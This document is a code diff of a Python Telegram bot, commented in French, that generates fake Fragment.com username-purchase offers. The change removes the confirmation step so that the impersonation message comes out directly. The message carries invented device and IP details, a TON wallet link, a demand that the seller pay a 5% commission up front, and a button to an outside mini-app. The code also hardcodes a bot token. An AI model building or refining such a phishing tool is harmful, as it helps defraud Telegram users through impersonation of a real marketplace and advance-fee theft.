@@ -25,7 +25,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # États de conversation
-USERNAME_INPUT, PRICE_INPUT, CONFIRMATION = range(3)
+USERNAME_INPUT, PRICE_INPUT = range(2)
 
 # Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN', '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c')
@@ -158,7 +158,7 @@ async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     return PRICE_INPUT
 
 async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Récupérer le prix"""
+    """Récupérer le prix et générer directement le message"""
     try:
         price = float(update.message.text.strip())
         user_id = update.effective_user.id
@@ -182,6 +182,7 @@ async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         # Mise à jour des données utilisateur
         if user_id in user_data:
             user_data[user_id]['price'] = price
+            username = user_data[user_id]['username']
         else:
             await update.message.reply_text(
                 "❌ **Error:** Username not found.\n"
@@ -189,32 +190,39 @@ async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             )
             return ConversationHandler.END
         
-        # Aperçu du deal
-        username = user_data[user_id]['username']
+        # Calcul de la commission (5%)
         commission = price * 0.05
-        price_usd = price * 3.04  # 1 TON ≈ 3.04 USD
-        commission_usd = commission * 3.04
         
-        keyboard = [
-            [
-                InlineKeyboardButton("✅ Confirm", callback_data='confirm_yes'),
-                InlineKeyboardButton("❌ Cancel", callback_data='confirm_no')
-            ]
-        ]
+        # Message de simulation Fragment (DIRECTEMENT SANS CONFIRMATION)
+        deal_message = f"""We have received a purchase request for your username @{username.upper()}_DEAL via Fragment.com. Below are the transaction details:
+
+• Offer Amount: 💎{price:g}
+• Commission: 💎{commission:g}
+
+Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
+
+Additional Information:
+• Device: Safari on macOS  
+• IP Address: 103.56.72.245
+• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
+
+Important:
+• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message."""
+        
+        # Bouton vers la mini-app
+        keyboard = [[InlineKeyboardButton("View details", url=f"https://myminiapp.onrender.com/?user={username}_deal&price={price:g}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            f"📋 **Deal Summary**\n\n"
-            f"👤 **Username:** `{username}`\n"
-            f"💰 **Price:** 💎{price:g} TON (≈${price_usd:.2f})\n"
-            f"💸 **Commission (5%):** 💎{commission:g} TON (≈${commission_usd:.2f})\n"
-            f"💎 **You receive:** 💎{price-commission:g} TON (≈${price_usd-commission_usd:.2f})\n\n"
-            f"⚠️ **Please confirm to proceed**",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
+            deal_message,
+            reply_markup=reply_markup
         )
         
-        return CONFIRMATION
+        # Nettoyage des données temporaires
+        del user_data[user_id]
+        
+        return ConversationHandler.END
         
     except ValueError:
         await update.message.reply_text(
@@ -223,69 +231,6 @@ async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             "📝 **Examples:** `1000`, `500.5`, `250`"
         )
         return PRICE_INPUT
-
-async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Confirmer le deal"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = update.effective_user.id
-    
-    if query.data == 'confirm_yes':
-        if user_id in user_data:
-            username = user_data[user_id]['username']
-            price = user_data[user_id]['price']
-            
-            # Calcul de la commission (5%)
-            commission = price * 0.05
-            price_usd = price * 3.04  # 1 TON ≈ 3.04 USD (approximatif)
-            commission_usd = commission * 3.04
-            
-            # Message de simulation Fragment
-            deal_message = f"""We have received a purchase request for your username @{username.upper()}_DEAL via Fragment.com. Below are the transaction details:
-
-• Offer Amount: 💎{price:g} (${price_usd:.2f})
-• Commission: 💎{commission:g} (${commission_usd:.2f})
-
-Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
-
-Additional Information:
-• Device: Safari on macOS  
-• IP Address: 103.56.72.245
-• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U (https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
-
-Important:
-• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
-• If you choose not to proceed, simply ignore this message."""
-            
-            # Bouton vers la mini-app
-            keyboard = [[InlineKeyboardButton("View details", url=f"https://myminiapp.onrender.com/?user={username}_deal&price={price:g}")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await query.edit_message_text(
-                deal_message,
-                reply_markup=reply_markup
-            )
-            
-            # Nettoyage des données temporaires
-            del user_data[user_id]
-        else:
-            await query.edit_message_text(
-                "❌ **Error:** Deal data not found.\n"
-                "Use /start to begin again."
-            )
-    
-    elif query.data == 'confirm_no':
-        await query.edit_message_text(
-            "❌ **Deal cancelled**\n\n"
-            "No worries! Use /start to create a new deal anytime. 👋"
-        )
-        
-        # Nettoyage des données
-        if user_id in user_data:
-            del user_data[user_id]
-    
-    return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Annuler la conversation"""
@@ -317,8 +262,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 1. 🚀 Use `/start` to begin
 2. 📝 Enter Fragment username  
 3. 💰 Set price in TON
-4. ✅ Confirm the deal
-5. 🔗 Get your deal link
+4. 🔗 Get your deal message instantly
 
 **Support:** This bot helps simulate Fragment.com username deals.
 
@@ -348,8 +292,7 @@ def main():
             ],
             states={
                 USERNAME_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
-                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)],
-                CONFIRMATION: [CallbackQueryHandler(confirm_deal)]
+                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)]
             },
             fallbacks=[CommandHandler('cancel', cancel)],
             per_message=False,
